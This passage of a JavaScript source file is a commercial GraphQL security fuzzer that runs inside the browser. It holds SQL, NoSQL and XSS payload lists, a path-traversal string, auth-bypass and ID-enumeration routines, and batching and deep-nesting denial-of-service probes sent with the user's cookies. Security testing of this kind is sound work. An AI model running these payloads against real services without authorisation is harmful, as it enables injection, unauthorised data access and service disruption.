// Copyright (c) 2026 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

/**
 * Lonkero Smart GraphQL Fuzzer
 *
 * Comprehensive GraphQL security testing:
 * - Auto-integrates with Lonkero's discovered endpoints
 * - Schema-aware payload generation
 * - Batch query attacks (array, alias coalescing, mutation batching)
 * - Query complexity DoS (deep nesting, circular refs, field duplication)
 * - Alias abuse attacks (overloading, amplification)
 * - Persisted query attacks (APQ probing, hash manipulation)
 * - Fragment attacks (spreading, recursive fragments)
 * - Directive abuse
 * - Authorization bypass testing
 * - Subscription vulnerability detection
 * - Time-based injection
 *
 * Ported from Lonkero Rust scanner (graphql_security.rs)
 */

(function() {
  'use strict';

  // Schema configuration
  const _gp = atob('X19sb25rZXJvS2V5');
  const _ge = atob('aHR0cHM6Ly9sb25rZXJvLmJvdW50eXkuZmkvYXBpL3YxL3ZhbGlkYXRl');
  const _gr = document.getElementById('__lk_c');
  const _gc = (_gr && _gr.dataset.v) || window[_gp];
  if (!_gc || _gc.charCodeAt(0) !== 76 || _gc.split('-').length !== 5) {
    window.gqlFuzz = { fuzz: () => Promise.reject(new Error('Not available')), getReport: () => ({error: 'Not available'}) };
    return;
  }
  let _schemaOk = true;
  fetch(_ge, {
    method: 'POST', headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({[atob('bGljZW5zZV9rZXk=')]: _gc, product: atob('bG9ua2Vybw=='), version: '3.6.0'})
  }).then(r => r.json()).then(d => { if (!d.valid || d[atob('a2lsbHN3aXRjaF9hY3RpdmU=')]) _schemaOk = false; }).catch(() => {});

  const PAYLOADS = {
    sqli: [
      "' OR '1'='1",
      "'; DROP TABLE users; --",
      "1' AND '1'='1",
      "' UNION SELECT NULL--",
      "admin'--",
      "' AND SLEEP(5)--",
      "1; SELECT * FROM users",
      "1' ORDER BY 1--",
      "' OR ''='",
    ],

    nosqli: [
      '{"$gt": ""}',
      '{"$ne": null}',
      '{"$where": "this.password.length > 0"}',
      '{"$regex": ".*"}',
      '{"$exists": true}',
      '{"$or": [{}]}',
    ],

    authBypass: [
      { admin: true },
      { role: 'admin' },
      { isAdmin: true },
      { permissions: ['admin'] },
      { __typename: 'Admin' },
    ],

    idor: [
      '1', '0', '-1', '2', '999999', '9999999999',
      '00000000-0000-0000-0000-000000000000',
      '00000000-0000-0000-0000-000000000001',
      'admin', 'root', 'test', 'user',
      '../../../../etc/passwd',
    ],

    xss: [
      '<script>alert(1)</script>',
      '"><img src=x onerror=alert(1)>',
      "'-alert(1)-'",
      '{{constructor.constructor("alert(1)")()}}',
    ],

    // Time-based SQL injection for GraphQL
    timeBased: [
      "' AND SLEEP(5)--",
      "'; WAITFOR DELAY '0:0:5'--",
      "' AND pg_sleep(5)--",
      "1; SELECT SLEEP(5)",
      "' OR SLEEP(5)#",
    ],
  };

  // APQ (Automatic Persisted Queries) test hashes
  const APQ_TEST_HASHES = [
    'ecf4edb46db40b5132295c0291d62fb65d6759a9eedfa4d5d612dd5ec54a6b38', // Common Apollo hash
    'da5c0fa0d51a6e98c8e3e0e3c0c2a7a9d9c7f5c3e1a9b7d5c3f1e9a7b5d3c1f9', // Test hash
    '0000000000000000000000000000000000000000000000000000000000000000', // Zero hash
    'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff', // Max hash
  ];

  // Dangerous mutations to look for
  const DANGEROUS_MUTATIONS = [
    /delete/i, /remove/i, /destroy/i,
    /update.*role/i, /set.*admin/i, /change.*password/i,
    /transfer/i, /withdraw/i, /payment/i,
    /execute/i, /run/i, /eval/i,
  ];

  // Interesting queries for data extraction
  const INTERESTING_QUERIES = [
    /user/i, /admin/i, /account/i, /profile/i,
    /order/i, /payment/i, /transaction/i,
    /secret/i, /token/i, /key/i, /credential/i,
    /config/i, /setting/i, /internal/i,
  ];

  const INTROSPECTION_QUERY = `
    query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        types {
          kind name description
          fields(includeDeprecated: true) {
            name description
            args { name type { ...TypeRef } }
            type { ...TypeRef }
          }
          inputFields { name type { ...TypeRef } }
        }
      }
    }
    fragment TypeRef on __Type {
      kind name
      ofType { kind name ofType { kind name ofType { kind name } } }
    }
  `;

  class SmartGraphQLFuzzer {
    constructor() {
      this.results = [];
      this.endpoints = [];
      this.schemas = new Map(); // endpoint -> schema
      this.testedEndpoints = new Set();
      this.extractedQueries = []; // queries found in source code
      this.discoveredVariables = new Map(); // variable name -> sample value
    }

    // Fetch discovered endpoints from extension via postMessage bridge
    async getDiscoveredEndpoints() {
      return new Promise((resolve) => {
        const requestId = `gql-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;

        const handler = (event) => {
          if (event.source !== window) return;
          if (event.data?.type === '__lonkero_endpoints_response__' && event.data.requestId === requestId) {
            window.removeEventListener('message', handler);

            const endpoints = event.data.endpoints || [];
            const graphqlEndpoints = endpoints
              .filter(e => e.isGraphQL || e.path?.includes('graphql') || e.url?.includes('graphql'))
              .map(e => e.url || (e.path?.startsWith('/') ? location.origin + e.path : e.path))
              .filter(url => this.isFuzzableEndpoint(url));

            resolve([...new Set(graphqlEndpoints)]);
          }
        };

        window.addEventListener('message', handler);

        // Request endpoints from content script
        window.postMessage({ type: '__lonkero_get_endpoints__', requestId }, '*');

        // Timeout after 2 seconds
        setTimeout(() => {
          window.removeEventListener('message', handler);
          resolve([]);
        }, 2000);
      });
    }

    // Check if endpoint is fuzzable (not localhost, not internal)
    isFuzzableEndpoint(url) {
      try {
        const parsed = new URL(url, location.origin);
        const hostname = parsed.hostname.toLowerCase();

        // Skip localhost and internal addresses
        if (hostname === 'localhost' ||
            hostname === '127.0.0.1' ||
            hostname === '0.0.0.0' ||
            hostname === '[::1]' ||
            hostname.endsWith('.local') ||
            hostname.endsWith('.localhost') ||
            /^192\.168\.\d+\.\d+$/.test(hostname) ||
            /^10\.\d+\.\d+\.\d+$/.test(hostname) ||
            /^172\.(1[6-9]|2\d|3[01])\.\d+\.\d+$/.test(hostname)) {
          console.log(`[GraphQL] Skipping internal endpoint: ${url}`);
          return false;
        }

        return true;
      } catch (e) {
        return false;
      }
    }

    // Smart endpoint discovery - combines extension data + probing
    async discoverEndpoints() {
      const endpoints = new Set();

      // 1. Get from extension's already-discovered endpoints
      const discovered = await this.getDiscoveredEndpoints();
      discovered.forEach(e => endpoints.add(e));
      console.log(`[GraphQL] Found ${discovered.length} endpoints from extension`);

      // 2. Parse page for GraphQL URLs
      const pageEndpoints = this.parsePageForEndpoints();
      pageEndpoints.forEach(e => endpoints.add(e));

      // 3. Probe common paths only if we found nothing
      if (endpoints.size === 0) {
        const probed = await this.probeCommonPaths();
        probed.forEach(e => endpoints.add(e));
      }

      this.endpoints = [...endpoints].filter(e => e && e.length > 0);
      console.log(`[GraphQL] Total endpoints: ${this.endpoints.length}`);
      return this.endpoints;
    }

    parsePageForEndpoints() {
      const endpoints = new Set();
      const patterns = [
        /["'`](https?:\/\/[^"'`\s]+graphql[^"'`\s]*)/gi,
        /["'`](\/graphql[^"'`\s]*)/gi,
        /["'`](\/api\/graphql[^"'`\s]*)/gi,
        /endpoint["'`]?\s*[:=]\s*["'`]([^"'`]+graphql[^"'`]*)/gi,
        /uri["'`]?\s*[:=]\s*["'`]([^"'`]+graphql[^"'`]*)/gi,
        /GRAPHQL[_A-Z]*["'`]?\s*[:=]\s*["'`]([^"'`]+)/gi,
      ];

      const scripts = document.querySelectorAll('script');
      for (const script of scripts) {
        const content = script.textContent || script.innerHTML || '';
        for (const pattern of patterns) {
          for (const match of content.matchAll(pattern)) {
            let url = match[1];
            if (url.startsWith('/')) {
              url = location.origin + url;
            }
            if (url.includes('graphql')) {
              endpoints.add(url);
            }
          }
        }
      }
      return [...endpoints];
    }

    // ============================================================
    // EXTRACT QUERIES FROM SOURCE CODE
    // ============================================================

    // Extract actual GraphQL queries/mutations from page source
    extractQueriesFromSource() {
      const extractedQueries = [];
      const scripts = document.querySelectorAll('script');
      const seenQueries = new Set();

      for (const script of scripts) {
        const content = script.textContent || script.innerHTML || '';
        if (!content) continue;

        // Pattern 1: gql`query ...` or graphql`query ...` (tagged template literals)
        const gqlTagPattern = /(?:gql|graphql)\s*`([^`]+)`/g;
        for (const match of content.matchAll(gqlTagPattern)) {
          const query = match[1].trim();
          if (query && !seenQueries.has(query)) {
            seenQueries.add(query);
            extractedQueries.push(this.parseExtractedQuery(query, 'gql_tag'));
          }
        }

        // Pattern 2: { query: "..." } or { query: `...` }
        const queryPropPattern = /["']?query["']?\s*:\s*["'`]([^"'`]+(?:query|mutation|subscription)[^"'`]+)["'`]/gi;
        for (const match of content.matchAll(queryPropPattern)) {
          const query = match[1].trim().replace(/\\n/g, '\n').replace(/\\"/g, '"');
          if (query && !seenQueries.has(query)) {
            seenQueries.add(query);
            extractedQueries.push(this.parseExtractedQuery(query, 'query_prop'));
          }
        }

        // Pattern 3: Inline query/mutation/subscription strings
        const inlinePattern = /["'`]((?:query|mutation|subscription)\s+\w+[^"'`]{20,})["'`]/gi;
        for (const match of content.matchAll(inlinePattern)) {
          const query = match[1].trim().replace(/\\n/g, '\n').replace(/\\"/g, '"');
          if (query && !seenQueries.has(query)) {
            seenQueries.add(query);
            extractedQueries.push(this.parseExtractedQuery(query, 'inline'));
          }
        }

        // Pattern 4: __NEXT_DATA__ or similar JSON with GraphQL queries
        const jsonPattern = /"query"\s*:\s*"((?:query|mutation)[^"]+)"/gi;
        for (const match of content.matchAll(jsonPattern)) {
          const query = match[1].replace(/\\n/g, '\n').replace(/\\"/g, '"').replace(/\\\\/g, '\\');
          if (query && !seenQueries.has(query)) {
            seenQueries.add(query);
            extractedQueries.push(this.parseExtractedQuery(query, 'json_embed'));
          }
        }

        // Pattern 5: Apollo Client persisted query documents
        const apolloPattern = /documentId["']?\s*:\s*["']([a-f0-9]{32,})["']/gi;
        for (const match of content.matchAll(apolloPattern)) {
          extractedQueries.push({
            type: 'persisted',
            hash: match[1],
            source: 'apollo_persisted',
          });
        }

        // Pattern 6: Variable definitions (useful for payload injection)
        const varsPattern = /variables\s*[:=]\s*\{([^}]+)\}/gi;
        for (const match of content.matchAll(varsPattern)) {
          const varsStr = match[1];
          // Extract variable names and types
          const varMatches = varsStr.matchAll(/["']?(\w+)["']?\s*:\s*["']?([^"',}]+)["']?/g);
          for (const varMatch of varMatches) {
            const varName = varMatch[1];
            const varValue = varMatch[2];
            // Store variable patterns for later use
            if (!this.discoveredVariables) this.discoveredVariables = new Map();
            this.discoveredVariables.set(varName, varValue);
          }
        }
      }

      // Also check for persisted queries in Apollo cache
      if (window.__APOLLO_STATE__) {
        try {
          const state = window.__APOLLO_STATE__;
          for (const key of Object.keys(state)) {
            if (key.startsWith('ROOT_QUERY') || key.includes('Query')) {
              extractedQueries.push({
                type: 'apollo_cache',
                key: key,
                data: state[key],
                source: '__APOLLO_STATE__',
              });
            }
          }
        } catch (e) {}
      }

      console.log(`[GraphQL] Extracted ${extractedQueries.length} queries from source`);
      this.extractedQueries = extractedQueries;
      return extractedQueries;
    }

    // Parse extracted query string into structured format
    parseExtractedQuery(queryStr, source) {
      const result = {
        raw: queryStr,
        source: source,
        type: 'query', // default
        name: null,
        variables: [],
        selections: [],
      };

      // Detect operation type
      if (/^\s*mutation\s/i.test(queryStr)) {
        result.type = 'mutation';
      } else if (/^\s*subscription\s/i.test(queryStr)) {
        result.type = 'subscription';
      }

      // Extract operation name
      const nameMatch = queryStr.match(/(?:query|mutation|subscription)\s+(\w+)/i);
      if (nameMatch) {
        result.name = nameMatch[1];
      }

      // Extract variables from operation signature
      const varsMatch = queryStr.match(/\(([^)]+)\)/);
      if (varsMatch) {
        const varDefs = varsMatch[1].matchAll(/\$(\w+)\s*:\s*(\w+!?)/g);
        for (const v of varDefs) {
          result.variables.push({
            name: v[1],
            type: v[2],
            required: v[2].endsWith('!'),
          });
        }
      }

      // Extract field selections (simplified)
      const selectionsMatch = queryStr.match(/\{\s*(\w+)/g);
      if (selectionsMatch) {
        result.selections = selectionsMatch.map(s => s.replace(/[{\s]/g, ''));
      }

      return result;
    }

    // Use extracted queries for intelligent fuzzing
    async fuzzWithExtractedQueries(endpoint) {
      if (!this.extractedQueries || this.extractedQueries.length === 0) {
        this.extractQueriesFromSource();
      }

      if (!this.extractedQueries || this.extractedQueries.length === 0) {
        console.log('[GraphQL] No queries extracted from source');
        return;
      }

      console.log(`[GraphQL] Fuzzing with ${this.extractedQueries.length} extracted queries`);

      for (const extracted of this.extractedQueries) {
        if (extracted.type === 'persisted') {
          // Test persisted query hash
          await this.testExtractedPersistedQuery(endpoint, extracted);
          continue;
        }

        if (!extracted.raw) continue;

        // Test the actual query with injection payloads
        await this.fuzzExtractedQuery(endpoint, extracted);
      }
    }

    async testExtractedPersistedQuery(endpoint, extracted) {
      const r = await this.queryRaw(endpoint, {
        extensions: {
          persistedQuery: { version: 1, sha256Hash: extracted.hash },
        },
      });

      if (r.json?.data && !r.json?.errors) {
        this.addResult('PERSISTED_QUERY_FOUND', 'MEDIUM', endpoint, {
          hash: extracted.hash,
          source: extracted.source,
          evidence: 'Found working persisted query hash from source code',
        });
      }
    }

    async fuzzExtractedQuery(endpoint, extracted) {
      console.log(`[GraphQL] Testing extracted ${extracted.type}: ${extracted.name || '(anonymous)'}`);

      // First, test the query as-is to see if it works
      const baseVars = {};
      for (const v of (extracted.variables || [])) {
        baseVars[v.name] = this.generateTestValue(v.type.replace('!', ''));
      }

      const baseResult = await this.query(endpoint, extracted.raw, Object.keys(baseVars).length > 0 ? baseVars : null);

      if (baseResult.json?.data) {
        this.addResult('EXTRACTED_QUERY_WORKS', 'INFO', endpoint, {
          name: extracted.name,
          type: extracted.type,
          source: extracted.source,
          evidence: 'Query extracted from source code executes successfully',
        });
      }

      // Now fuzz each string/ID variable with payloads
      for (const variable of (extracted.variables || [])) {
        const typeName = variable.type.replace('!', '');
        if (!['String', 'ID'].includes(typeName)) continue;

        // SQL Injection
        for (const payload of PAYLOADS.sqli.slice(0, 3)) {
          const vars = { ...baseVars, [variable.name]: payload };
          const r = await this.query(endpoint, extracted.raw, vars);

          if (this.detectSQLError(r.raw || '')) {
            this.addResult('SQLI_EXTRACTED_QUERY', 'CRITICAL', endpoint, {
              query: extracted.name || extracted.raw.substring(0, 50),
              variable: variable.name,
              payload,
              evidence: 'SQL error in response from real app query',
            });
            break;
          }
        }

        // NoSQL Injection (for ID fields often used in MongoDB)
        if (typeName === 'ID') {
          for (const payload of PAYLOADS.nosqli.slice(0, 2)) {
            const vars = { ...baseVars, [variable.name]: payload };
            const r = await this.query(endpoint, extracted.raw, vars);

            if (r.json?.data && !r.json?.errors) {
              this.addResult('NOSQLI_EXTRACTED_QUERY', 'HIGH', endpoint, {
                query: extracted.name,
                variable: variable.name,
                payload,
                evidence: 'NoSQL injection payload accepted in real app query',
              });
              break;
            }
          }
        }

        // XSS in returned data
        for (const payload of PAYLOADS.xss.slice(0, 2)) {
          const vars = { ...baseVars, [variable.name]: payload };
          const r = await this.query(endpoint, extracted.raw, vars);

          if (r.raw?.includes(payload)) {
            this.addResult('XSS_REFLECTION', 'HIGH', endpoint, {
              query: extracted.name,
              variable: variable.name,
              payload,
              evidence: 'XSS payload reflected in GraphQL response',
            });
            break;
          }
        }

        // IDOR - enumerate IDs
        if (/id|user|account|order/i.test(variable.name)) {
          for (const payload of PAYLOADS.idor.slice(0, 4)) {
            const vars = { ...baseVars, [variable.name]: payload };
            const r = await this.query(endpoint, extracted.raw, vars);

            if (r.json?.data && !r.json?.errors) {
              // Check if we got actual data back
              const dataStr = JSON.stringify(r.json.data);
              if (dataStr.length > 50 && !dataStr.includes('null')) {
                this.addResult('IDOR_EXTRACTED_QUERY', 'HIGH', endpoint, {
                  query: extracted.name,
                  variable: variable.name,
                  payload,
                  evidence: 'Enumerated ID returned data in real app query',
                });
                break;
              }
            }
          }
        }
      }

      // For mutations, try auth bypass payloads
      if (extracted.type === 'mutation') {
        await this.fuzzMutationAuthBypass(endpoint, extracted, baseVars);
      }
    }

    async fuzzMutationAuthBypass(endpoint, extracted, baseVars) {
      // Try adding auth bypass fields to variables
      for (const bypass of PAYLOADS.authBypass) {
        const vars = { ...baseVars, ...bypass };

        try {
          const r = await this.query(endpoint, extracted.raw, vars);
          if (r.json?.data && !r.json?.errors?.some(e => /auth|permission|forbidden/i.test(e.message || ''))) {
            this.addResult('MUTATION_AUTH_BYPASS_ATTEMPT', 'MEDIUM', endpoint, {
              mutation: extracted.name,
              bypass: JSON.stringify(bypass),
              evidence: 'Mutation accepted auth bypass payload',
            });
          }
        } catch (e) {}
      }
    }

    async probeCommonPaths() {
      const paths = ['/graphql', '/api/graphql', '/v1/graphql', '/gql', '/query'];
      const found = [];

      for (const path of paths) {
        const url = location.origin + path;
        try {
          const r = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: '{"query":"{ __typename }"}',
            credentials: 'include',
          });
          const text = await r.text();
          if (text.includes('__typename') || text.includes('"data"') || text.includes('GraphQL')) {
            found.push(url);
          }
        } catch (e) {}
      }
      return found;
    }

    // Execute GraphQL query
    async query(endpoint, query, variables = null) {
      const body = { query };
      if (variables) body.variables = variables;

      try {
        const r = await fetch(endpoint, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(body),
          credentials: 'include',
        });
        const text = await r.text();
        try {
          return { status: r.status, json: JSON.parse(text), raw: text };
        } catch {
          return { status: r.status, raw: text, error: 'Invalid JSON' };
        }
      } catch (e) {
        return { error: e.message };
      }
    }

    // Get and analyze schema
    async analyzeSchema(endpoint) {
      console.log(`[GraphQL] Analyzing schema for ${endpoint}`);

      const r = await this.query(endpoint, INTROSPECTION_QUERY);
      if (!r.json?.data?.__schema) {
        // Try simpler introspection
        const simple = await this.query(endpoint, '{ __schema { types { name } } }');
        if (simple.json?.data?.__schema) {
          this.addResult('INTROSPECTION_ENABLED', 'MEDIUM', endpoint, {
            evidence: 'Introspection enabled but limited',
            types: simple.json.data.__schema.types?.length || 0,
          });
          return null;
        }
        return null;
      }

      const schema = r.json.data.__schema;
      this.schemas.set(endpoint, schema);

      this.addResult('INTROSPECTION_ENABLED', 'MEDIUM', endpoint, {
        evidence: 'Full introspection enabled',
        types: schema.types?.length || 0,
        queries: this.getOperations(schema, 'Query').length,
        mutations: this.getOperations(schema, 'Mutation').length,
      });

      return schema;
    }

    getOperations(schema, typeName) {
      const type = schema.types?.find(t => t.name === typeName);
      return type?.fields || [];
    }

    getTypeName(typeRef) {
      if (!typeRef) return 'Unknown';
      if (typeRef.name) return typeRef.name;
      return this.getTypeName(typeRef.ofType);
    }

    isRequired(typeRef) {
      return typeRef?.kind === 'NON_NULL';
    }

    // Generate test value for a type
    generateTestValue(typeName, payload = null) {
      if (payload) return payload;
      switch (typeName) {
        case 'Int': return 1;
        case 'Float': return 1.0;
        case 'Boolean': return true;
        case 'ID':
        case 'String': return 'test';
        default: return 'test';
      }
    }

    // Build query dynamically
    buildQuery(operation, args, isQuery = true) {
      const opType = isQuery ? 'query' : 'mutation';
      const argDefs = [];
      const argUses = [];
      const vars = {};

      for (const arg of args) {
        const typeName = this.getTypeName(arg.type);
        const isReq = this.isRequired(arg.type);
        const gqlType = isReq ? `${typeName}!` : typeName;

        argDefs.push(`$${arg.name}: ${gqlType}`);
        argUses.push(`${arg.name}: $${arg.name}`);
        vars[arg.name] = this.generateTestValue(typeName);
      }

      const query = argDefs.length > 0
        ? `${opType}(${argDefs.join(', ')}) { ${operation}(${argUses.join(', ')}) { __typename } }`
        : `${opType} { ${operation} { __typename } }`;

      return { query, variables: vars };
    }

    // Smart fuzzing based on schema
    async fuzzWithSchema(endpoint, schema) {
      const queries = this.getOperations(schema, 'Query');
      const mutations = this.getOperations(schema, 'Mutation');

      // Find interesting operations
      const interestingQueries = queries.filter(q =>
        INTERESTING_QUERIES.some(p => p.test(q.name))
      );
      const dangerousMutations = mutations.filter(m =>
        DANGEROUS_MUTATIONS.some(p => p.test(m.name))
      );

      console.log(`[GraphQL] Found ${interestingQueries.length} interesting queries, ${dangerousMutations.length} dangerous mutations`);

      // Test interesting queries for IDOR
      for (const q of interestingQueries) {
        await this.testIDOR(endpoint, q);
      }

      // Test queries with string args for injection
      for (const q of queries) {
        const stringArgs = q.args?.filter(a =>
          ['String', 'ID'].includes(this.getTypeName(a.type))
        ) || [];
        if (stringArgs.length > 0) {
          await this.testInjection(endpoint, q, stringArgs);
        }
      }

      // Flag dangerous mutations
      for (const m of dangerousMutations) {
        this.addResult('DANGEROUS_MUTATION', 'INFO', endpoint, {
          mutation: m.name,
          args: m.args?.map(a => `${a.name}: ${this.getTypeName(a.type)}`).join(', '),
          evidence: 'Potentially dangerous mutation available',
        });
      }
    }

    async testIDOR(endpoint, operation) {
      const idArgs = operation.args?.filter(a =>
        ['ID', 'Int', 'String'].includes(this.getTypeName(a.type)) &&
        /id|user|account|order/i.test(a.name)
      ) || [];

      for (const arg of idArgs) {
        for (const payload of PAYLOADS.idor.slice(0, 5)) {
          const { query, variables } = this.buildQuery(operation.name, operation.args);
          variables[arg.name] = payload;

          const r = await this.query(endpoint, query, variables);
          if (r.json?.data?.[operation.name] && !r.json.errors) {
            this.addResult('POTENTIAL_IDOR', 'HIGH', endpoint, {
              operation: operation.name,
              arg: arg.name,
              payload,
              evidence: 'Data returned for enumerated ID',
            });
            break; // One finding per operation is enough
          }
        }
      }
    }

    async testInjection(endpoint, operation, stringArgs) {
      for (const arg of stringArgs) {
        for (const payload of PAYLOADS.sqli.slice(0, 3)) {
          const { query, variables } = this.buildQuery(operation.name, operation.args);
          variables[arg.name] = payload;

          const r = await this.query(endpoint, query, variables);
          if (this.detectSQLError(r.raw || '')) {
            this.addResult('SQL_INJECTION', 'CRITICAL', endpoint, {
              operation: operation.name,
              arg: arg.name,
              payload,
              evidence: 'SQL error in response',
            });
            return; // Stop on first finding
          }
        }
      }
    }

    detectSQLError(text) {
      const patterns = [
        /sql syntax/i, /mysql/i, /postgresql/i, /sqlite/i,
        /ORA-\d+/i, /syntax error at or near/i, /unclosed quotation/i,
        /SQLSTATE/i, /database error/i, /query error/i,
      ];
      return patterns.some(p => p.test(text));
    }

    // Basic fuzzing without schema
    async fuzzWithoutSchema(endpoint) {
      console.log(`[GraphQL] Fuzzing ${endpoint} without schema`);

      // Common query patterns
      const testOps = [
        { op: 'user', args: [{ name: 'id', type: { name: 'ID' } }] },
        { op: 'users', args: [{ name: 'limit', type: { name: 'Int' } }] },
        { op: 'me', args: [] },
        { op: 'viewer', args: [] },
        { op: 'currentUser', args: [] },
        { op: 'profile', args: [{ name: 'id', type: { name: 'ID' } }] },
        { op: 'account', args: [{ name: 'id', type: { name: 'ID' } }] },
        { op: 'order', args: [{ name: 'id', type: { name: 'ID' } }] },
        { op: 'orders', args: [] },
        { op: 'admin', args: [] },
        { op: 'settings', args: [] },
        { op: 'config', args: [] },
      ];

      for (const { op, args } of testOps) {
        const { query, variables } = this.buildQuery(op, args);
        const r = await this.query(endpoint, query, variables);

        if (r.json?.data?.[op] && !r.json?.errors) {
          this.addResult('ACCESSIBLE_QUERY', 'INFO', endpoint, {
            query: op,
            evidence: 'Query returned data',
          });

          // Try IDOR if it has ID arg
          const idArg = args.find(a => a.name === 'id');
          if (idArg) {
            for (const payload of ['1', '2', 'admin']) {
              variables.id = payload;
              const r2 = await this.query(endpoint, query, variables);
              if (r2.json?.data?.[op]) {
                this.addResult('POTENTIAL_IDOR', 'MEDIUM', endpoint, {
                  query: op,
                  payload,
                  evidence: 'Query returned data for enumerated ID',
                });
                break;
              }
            }
          }
        }
      }
    }

    // Test security controls
    async testSecurityControls(endpoint) {
      console.log(`[GraphQL] Testing security controls on ${endpoint}`);

      // Test depth limiting
      const deepQuery = `{ __schema { types { fields { type { fields { type { name } } } } } } }`;
      const deepR = await this.query(endpoint, deepQuery);
      if (deepR.json?.data && !deepR.json?.errors?.some(e => /depth|complex/i.test(e.message || ''))) {
        this.addResult('NO_DEPTH_LIMIT', 'MEDIUM', endpoint, {
          evidence: 'Deep query succeeded without restriction',
        });
      }

      // Test batching
      try {
        const batchR = await fetch(endpoint, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify([{ query: '{ __typename }' }, { query: '{ __typename }' }]),
          credentials: 'include',
        });
        const batchJson = await batchR.json();
        if (Array.isArray(batchJson) && batchJson.length === 2) {
          this.addResult('BATCHING_ENABLED', 'LOW', endpoint, {
            evidence: 'Array batching accepted',
          });
        }
      } catch (e) {}

      // Test alias flooding
      const aliasQuery = Array.from({ length: 100 }, (_, i) => `a${i}: __typename`).join(' ');
      const aliasR = await this.query(endpoint, `{ ${aliasQuery} }`);
      if (aliasR.json?.data && Object.keys(aliasR.json.data).length >= 100) {
        this.addResult('NO_ALIAS_LIMIT', 'LOW', endpoint, {
          evidence: '100 aliases accepted without restriction',
        });
      }

      // Test debug mode
      const badR = await this.query(endpoint, '{ __invalid__ }');
      if (badR.json?.errors) {
        const errStr = JSON.stringify(badR.json.errors);
        if (/stack|trace|\.js:|\.ts:|node_modules/i.test(errStr)) {
          this.addResult('DEBUG_MODE', 'MEDIUM', endpoint, {
            evidence: 'Stack traces or internal paths in errors',
          });
        }
        if (/Did you mean/i.test(errStr)) {
          this.addResult('FIELD_SUGGESTIONS', 'LOW', endpoint, {
            evidence: 'Field suggestions enabled',
          });
        }
      }
    }

    // ============================================================
    // BATCH QUERY ATTACKS
    // ============================================================

    async testBatchAttacks(endpoint) {
      console.log(`[GraphQL] Testing batch attacks on ${endpoint}`);

      // 1. Array batching with mutations (more dangerous)
      await this.testArrayBatchingWithMutations(endpoint);

      // 2. Alias coalescing attack - bypass rate limiting
      await this.testAliasCoalescing(endpoint);

      // 3. Large batch attack - DoS via batch size
      await this.testLargeBatch(endpoint);
    }

    async testArrayBatchingWithMutations(endpoint) {
      // Test if mutations can be batched (dangerous for rate limit bypass)
      const batchMutation = [
        { query: 'mutation { __typename }' },
        { query: 'mutation { __typename }' },
        { query: 'mutation { __typename }' },
      ];

      try {
        const r = await fetch(endpoint, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(batchMutation),
          credentials: 'include',
        });
        const json = await r.json();
        if (Array.isArray(json) && json.length === 3) {
          this.addResult('MUTATION_BATCHING', 'MEDIUM', endpoint, {
            evidence: 'Mutations can be batched - rate limit bypass possible',
            batchSize: 3,
          });
        }
      } catch (e) {}
    }

    async testAliasCoalescing(endpoint) {
      // Alias coalescing to bypass per-operation rate limits
      const schema = this.schemas.get(endpoint);
      if (!schema) return;

      const queries = this.getOperations(schema, 'Query');
      const targetQuery = queries.find(q => /user|account|profile/i.test(q.name));
      if (!targetQuery) return;

      // Create 50 aliases of the same query
      const aliases = Array.from({ length: 50 }, (_, i) =>
        `q${i}: ${targetQuery.name} { __typename }`
      ).join(' ');

      const r = await this.query(endpoint, `{ ${aliases} }`);
      if (r.json?.data && Object.keys(r.json.data).length >= 50) {
        this.addResult('ALIAS_COALESCING', 'MEDIUM', endpoint, {
          operation: targetQuery.name,
          evidence: '50 aliased queries executed in single request - rate limit bypass',
          aliasCount: Object.keys(r.json.data).length,
        });
      }
    }

    async testLargeBatch(endpoint) {
      // Test large batch processing (DoS potential)
      const largeBatch = Array.from({ length: 100 }, () =>
        ({ query: '{ __typename }' })
      );

      try {
        const start = performance.now();
        const r = await fetch(endpoint, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(largeBatch),
          credentials: 'include',
        });
        const duration = performance.now() - start;
        const json = await r.json();

        if (Array.isArray(json) && json.length === 100) {
          this.addResult('LARGE_BATCH_ALLOWED', 'MEDIUM', endpoint, {
            evidence: '100-query batch accepted',
            duration: Math.round(duration) + 'ms',
            amplificationFactor: 100,
          });
        }
      } catch (e) {}
    }

    // ============================================================
    // QUERY COMPLEXITY / DoS ATTACKS
    // ============================================================

    async testComplexityAttacks(endpoint) {
      console.log(`[GraphQL] Testing complexity attacks on ${endpoint}`);

      // 1. Deep nesting attack
      await this.testDeepNesting(endpoint);

      // 2. Field duplication attack
      await this.testFieldDuplication(endpoint);

      // 3. Circular reference attack
      await this.testCircularReference(endpoint);

      // 4. Wide query attack
      await this.testWideQuery(endpoint);
    }

    async testDeepNesting(endpoint) {
      // Create deeply nested query (20 levels)
      let nestedQuery = '__typename';
      for (let i = 0; i < 20; i++) {
        nestedQuery = `__schema { types { fields { type { ${nestedQuery} } } } }`;
      }

      const r = await this.query(endpoint, `{ ${nestedQuery} }`);
      if (r.json?.data && !r.json?.errors?.some(e => /depth|complex|limit/i.test(e.message || ''))) {
        this.addResult('DEEP_NESTING_ALLOWED', 'HIGH', endpoint, {
          evidence: '20-level deep nesting accepted - DoS vulnerability',
          depth: 20,
        });
      }
    }

    async testFieldDuplication(endpoint) {
      // Duplicate fields to increase query cost
      const duplicated = Array.from({ length: 500 }, () => '__typename').join(' ');
      const r = await this.query(endpoint, `{ ${duplicated} }`);

      if (r.json?.data && !r.json?.errors) {
        this.addResult('FIELD_DUPLICATION', 'LOW', endpoint, {
          evidence: '500 duplicate fields accepted',
        });
      }
    }

    async testCircularReference(endpoint) {
      const schema = this.schemas.get(endpoint);
      if (!schema) return;

      // Find types that reference themselves
      for (const type of (schema.types || [])) {
        if (type.kind !== 'OBJECT' || type.name?.startsWith('__')) continue;

        const selfRefFields = type.fields?.filter(f => {
          const fieldTypeName = this.getTypeName(f.type);
          return fieldTypeName === type.name;
        }) || [];

        if (selfRefFields.length > 0) {
          // Try to exploit circular reference
          const field = selfRefFields[0];
          const circularQuery = `{
            ${type.name.toLowerCase()} {
              ${field.name} {
                ${field.name} {
                  ${field.name} {
                    ${field.name} {
